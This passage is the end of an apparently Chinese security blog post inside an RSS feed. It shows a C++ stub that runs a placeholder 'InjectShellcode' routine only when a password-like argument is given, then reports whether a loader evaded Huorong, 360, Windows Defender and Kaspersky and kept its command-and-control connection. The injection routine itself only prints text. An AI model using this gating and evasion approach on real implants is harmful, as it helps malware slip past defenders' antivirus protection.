World&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;InjectShellcode&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Inject shellcode!!!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* argv[])&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (argc &amp;gt;= &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((std::string)argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] == &lt;span class=&#34;string&#34;&gt;&amp;quot;123456&amp;quot;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;InjectShellcode&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;Hello&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;pause&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnqp2zdzbnj31bz0plt9l.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnqp315am2j30y60plmyf.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;最终效果如下：
火绒：可持续上线不会掉
360：可持续上线，可能长时间会掉
windef：可上线但执行不了命令(现在已经被标记了上不了线)
卡巴斯基：可过静态无法上线
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp35147bj31mf0mcwml.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hnqp390367j31kp0koagt.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hnqp3avk4jj30sg0qmju1.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;//dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hnqp3dngo0j30s80lsacp.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
